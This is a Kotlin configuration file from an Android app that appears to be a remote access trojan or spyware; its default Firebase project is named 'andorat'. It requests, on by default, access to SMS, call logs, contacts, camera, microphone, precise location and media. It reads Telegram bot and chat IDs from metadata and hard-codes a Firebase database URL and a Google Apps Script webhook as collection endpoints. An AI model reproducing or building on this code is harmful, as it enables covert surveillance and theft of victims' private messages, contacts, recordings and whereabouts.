package com.example.myapplicationtestweb

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build

object Config {
    // (Telegram integration removed, relying purely on Firebase)

    fun getRequiredPermissions(context: Context): List<String> {
        val perms = mutableListOf<String>()
        
        val enableGallery = getMetaData(context, "feat_gallery") != "false"
        val enableFiles = getMetaData(context, "feat_files") != "false"
        val enableAudio = getMetaData(context, "feat_audio") != "false"
        val enableCamera = getMetaData(context, "feat_camera") != "false"
        val enableLocation = getMetaData(context, "feat_location") != "false"
        val enableCalls = getMetaData(context, "feat_calls") != "false"
        val enableSms = getMetaData(context, "feat_sms") != "false"

        if (enableSms) {
            perms.add(Manifest.permission.READ_SMS)
            perms.add(Manifest.permission.RECEIVE_SMS)
        }
        if (enableCalls) {
            perms.add(Manifest.permission.READ_CALL_LOG)
            perms.add(Manifest.permission.READ_CONTACTS)
        }
        if (enableCamera) {
            perms.add(Manifest.permission.CAMERA)
        }
        if (enableAudio) {
            perms.add(Manifest.permission.RECORD_AUDIO)
        }
        if (enableLocation) {
            perms.add(Manifest.permission.ACCESS_FINE_LOCATION)
            perms.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (enableGallery || enableFiles) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
                perms.add(Manifest.permission.READ_MEDIA_VIDEO)
                perms.add(Manifest.permission.READ_MEDIA_AUDIO)
            } else {
                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        return perms
    }

    fun getMetaData(context: Context, key: String): String {
        return try {
            val ai = context.packageManager.getApplicationInfo(context.packageName, PackageManager.GET_META_DATA)
            val bundle = ai.metaData
            bundle?.get(key)?.toString() ?: ""
        } catch (e: Exception) { "" }
    }

    fun getUserId(context: Context) = getMetaData(context, "user_id")
    fun getUserMainBot(context: Context) = getMetaData(context, "main_bot")
    fun getUserLogBot(context: Context) = getMetaData(context, "log_bot")
    fun getUserChatId(context: Context) = getMetaData(context, "chat_id")
    fun getWebUrl(context: Context) = getMetaData(context, "webview_url")
    fun getDbUrl(context: Context): String {
        val url = getMetaData(context, "firebase_url")
        return if (url.isNotEmpty()) url else "https://andorat-c2181-default-rtdb.asia-southeast1.firebasedatabase.app/"
    }

    fun getDriveWebhookUrl(context: Context): String {
        val url = getMetaData(context, "drive_webhook_url")
        return if (url.isNotEmpty()) url else "https://script.google.com/macros/s/AKfycbxXY04auYkCIwzpCkhYzanzVLtzagGhbflSdctjrZee10U5T8d7FbhIa6T41hQNTm4E/exec"
    }
}

